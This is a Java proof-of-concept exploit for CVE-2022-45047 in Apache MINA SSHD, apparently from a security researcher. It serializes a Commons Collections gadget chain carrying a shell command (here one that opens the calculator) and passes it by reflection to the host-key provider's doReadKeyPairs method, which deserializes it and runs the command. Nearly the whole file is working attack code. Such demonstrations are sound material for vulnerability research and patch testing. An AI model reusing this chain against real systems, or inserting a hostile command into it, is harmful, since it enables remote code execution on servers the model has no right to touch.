package org.example;

import org.apache.sshd.common.NamedResource;
import org.apache.sshd.common.session.SessionContext;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;

import java.io.*;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 *  CVE-2022-45047
 */
public class CVE_2022_45047 {
    public static void main(String[] args) throws Exception{
        Object object = Serializer.cc5("open -a Calculator.app");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        Object object1 = objectInputStream.readObject();



        SimpleGeneratorHostKeyProvider simpleGeneratorHostKeyProvider = new SimpleGeneratorHostKeyProvider();
        // 反射 protected Iterable<KeyPair> doReadKeyPairs(SessionContext session, NamedResource resourceKey, InputStream inputStream)
        Method method = simpleGeneratorHostKeyProvider.getClass().getDeclaredMethod("doReadKeyPairs", SessionContext.class, NamedResource.class, InputStream.class);
        method.setAccessible(true);
        method.invoke(simpleGeneratorHostKeyProvider, null, null, byteArrayInputStream);

    }
}
